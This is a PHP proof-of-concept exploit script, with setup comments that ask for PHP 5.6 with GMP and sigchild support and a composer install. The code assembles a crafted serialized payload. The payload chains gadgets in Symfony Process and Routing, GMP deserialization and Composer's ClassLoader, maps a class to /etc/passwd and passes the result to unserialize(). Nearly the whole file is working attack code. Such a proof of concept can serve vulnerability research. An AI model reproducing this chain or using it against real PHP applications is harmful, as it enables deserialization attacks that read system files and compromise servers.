<?php

/*

Needs PHP 5.6.* compiled with '--with-gmp' and '--enable-sigchild'
$ /home/user/php-5.6.40/bin/php -i | grep configure
Configure Command =>  './configure' ... '--with-gmp' --enable-sigchild'

1) Install packages from composer
$ composer install

2) Run POC:
$ /home/user/php-5.6.40/bin/php ./poc.php

*/


include __DIR__.'/vendor/autoload.php';

$s = 'O:33:"Symfony\\Component\\Process\\Process":6:{';
$s .= 's:63:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'enhanceSigchildCompatibility";b:1;';
$s .= 's:41:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'status";s:7:"started";';
$s .= 's:47:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'processPipes";O:41:"Symfony\\Component\\Process\\Pipes\\UnixPipes":0:{}';
$s .= 's:53:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'processInformation";O:41:"Symfony\\Component\\Process\\Pipes\\UnixPipes":1:{s:5:"pipes";R:12;}';
$s .= 's:49:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'fallbackStatus";a:1:{s:8:"exitcode";i:1;}';
$s .= 's:43:"'.chr(0).'Symfony\\Component\\Process\\Process'.chr(0).'exitcode";R:2;';
$s .= 'A';

$composer_props = 's:39:"'.chr(0).'Composer\\Autoload\\ClassLoader'.chr(0).'classMap";a:1:{s:11:"LoadMeClass";s:11:"/etc/passwd";}';

$inner = 's:1:"1";a:2:{'.$composer_props.'i:777;C:31:"Symfony\\Component\\Routing\\Route":'.strlen($s).':{'.$s.'}}';

$exploit = 'a:2:{i:1;C:3:"GMP":'.strlen($inner).':{'.$inner.'}i:2;O:11:"LoadMeClass":0:{}}';

unserialize($exploit);

?>